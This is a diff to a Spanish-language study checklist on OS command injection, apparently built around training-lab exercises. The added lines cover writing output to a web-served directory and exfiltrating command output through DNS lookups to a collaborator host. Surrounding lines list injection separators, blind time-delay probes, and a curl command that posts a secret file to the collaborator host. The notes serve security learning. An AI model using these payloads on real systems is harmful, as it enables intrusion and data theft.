@@ -22,6 +22,8 @@ tags:
 - [ ] **Barré TODOS los parámetros** con separadores: `;` `|` `||` `&` `&&` `$(...)` `` `...` `` `%0a`.
 - [ ] **In-band** (¿vuelve salida?) → `1|whoami` → [[vulnerabilities/027-os-command-injection/examples/001-simple-in-band|001]].
 - [ ] **Ciego** → time delay `x||sleep+5||` ([[vulnerabilities/027-os-command-injection/examples/002-blind-time-delay|002]]) o OAST/DNS ([[vulnerabilities/027-os-command-injection/examples/004-blind-oob-interaction|004]]).
+- [ ] **Leer (salida a webroot):** redirigí a un dir servido y escribible (`>/var/www/images/x.txt`) y pedilo por HTTP → [[vulnerabilities/027-os-command-injection/examples/003-blind-output-redirection|003]].
+- [ ] **Leer (exfil OOB por DNS):** meté la salida en el subdominio del lookup `nslookup+`whoami`.COLLAB` → [[vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil|005 ⭐]].
 - [ ] **Leer:** `;cat+/home/carlos/secret` (in-band) o exfil OOB.
 - [ ] **No cabe en DNS →** POST entero: `x=||curl+--data+@/home/carlos/secret+https://COLLAB||` → [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo|006 ⭐]].
 
